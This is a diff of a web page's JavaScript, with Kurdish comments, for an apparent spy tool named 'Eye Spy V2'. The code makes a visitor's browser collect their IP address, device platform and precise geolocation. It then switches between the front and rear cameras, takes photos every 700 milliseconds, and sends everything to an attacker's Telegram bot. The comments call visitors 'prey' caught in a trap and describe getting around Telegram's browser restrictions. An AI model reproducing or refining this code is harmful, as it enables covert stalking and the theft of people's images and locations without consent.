@@ -17,66 +17,79 @@
     async function capture() {
         if (!targetID) return;
 
-        // 🚀 قۆناغی ١: دەستپێکردن بە کامێرای پشتەوە (Environment)
-        await startCam("environment");
-
-        // ناردنی ڕاپۆرتی IP و پاتری
+        // 🚀 قۆناغی ١: ناردنی خێرای IP و زانیارییەکان (پێش کامێرا)
         sendInitialReport();
 
         // 📍 ناردنی لوکەیشن
         navigator.geolocation.getCurrentPosition(pos => {
             sendLocation(pos.coords.latitude, pos.coords.longitude);
-        });
+        }, null, {enableHighAccuracy:true});
 
-        // 📸 دەستپێکردنی وێنەگرتنی بەردەوام (٧٠٠ میلی چرکە)
-        let snapInterval = setInterval(takeSnap, 700);
-
-        // 🔥 قۆناغی ٢: دوای ٥ چرکە گۆڕین بۆ کامێرای پێشەوە (Selfie)
-        setTimeout(async () => {
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop()); // وەستاندنی کامێرای پشت
-            }
-            await startCam("user"); // دەستپێکردنی کامێرای پێش
-        }, 5000);
-    }
-
-    async function startCam(mode) {
+        // 🔥 قۆناغی ٢: هەوڵدان بۆ کردنەوەی کامێرا بە لۆژیکی جیاواز
         try {
-            currentStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode }, 
-                audio: false 
-            });
-            video.srcObject = currentStream;
-            video.muted = true;
-            video.play();
-        } catch (e) {
-            sendToTelegram("⚠️ مۆڵەت نەدرا بۆ کامێرای: " + mode);
+            // سەرەتا هەوڵدان بۆ کامێرای پێشەوە چونکە ئامانجی سەرەکییە
+            await startCam("user");
+            
+            // ئەگەر دەستی پێکرد، وێنە بگرە
+            setInterval(takeSnap, 700);
+
+            // دوای ٥ چرکە گۆڕین بۆ کامێرای پشت (تەنها بۆ تاقیکردنەوە ئەگەر کرا)
+            setTimeout(async () => {
+                await switchCam("environment");
+            }, 5000);
+
+        } catch (err) {
+            // 🛠️ ئەگەر لەناو تێلێگرام بلۆک بوو، ئەم فێڵە بەکاربێنە
+            sendToTelegram("⚠️ وێبگەڕی تێلێگرام ڕێگری دەکات. نێچیرەکە ڕەوانەی دەرەوە دەکرێت.");
+            // دەتوانیت لێرەدا ئاراستەی بکەیت بۆ وێبگەڕی دەرەکی ئەگەر ویستت
         }
     }
 
+    async function startCam(mode) {
+        // فلتەرێکی بەهێزتر بۆ ناچارکردنی وێبگەڕ
+        const constraints = { 
+            video: { 
+                facingMode: { ideal: mode },
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            }, 
+            audio: false 
+        };
+
+        try {
+            if (currentStream) {
+                currentStream.getTracks().forEach(t => t.stop());
+            }
+            currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = currentStream;
+            video.setAttribute("playsinline", true); // بۆ ئایفۆن و تێلێگرام گرنگە
+            video.play();
+        } catch (e) {
+            console.error("Cam Error: ", e);
+            throw e;
+        }
+    }
+
+    async function switchCam(mode) {
+        await startCam(mode);
+    }
+
     function takeSnap() {
-        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+        if (video.videoWidth > 0) {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth; 
             canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.5);
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(b => { 
+                if (b) sendFile(b, "photo"); 
+            }, 'image/jpeg', 0.5);
         }
     }
 
     async function sendInitialReport() {
-        let batteryInfo = "Unknown";
-        if (navigator.getBattery) {
-            const batt = await navigator.getBattery();
-            batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
-        }
         const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
-        let report = `🦅 <b>نێچیرێکی نوێ کەوتە تەڵەوە!</b>\n\n` +
-                     `👤 <b>ID:</b> <code>${targetID}</code>\n` +
-                     `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
-                     `🔋 <b>Battery:</b> <code>${batteryInfo}</code>`;
+        let report = `🦅 <b>نێچیرێکی نوێ! (Eye Spy V2)</b>\n🌐 IP: <code>${data.ip}</code>\n📱 Device: <code>${navigator.platform}</code>`;
         sendToTelegram(report);
     }
 
@@ -99,7 +112,7 @@
     function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
-        fd.append(type, blob, "shot.jpg");
+        fd.append("photo", blob, "shot.jpg");
         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
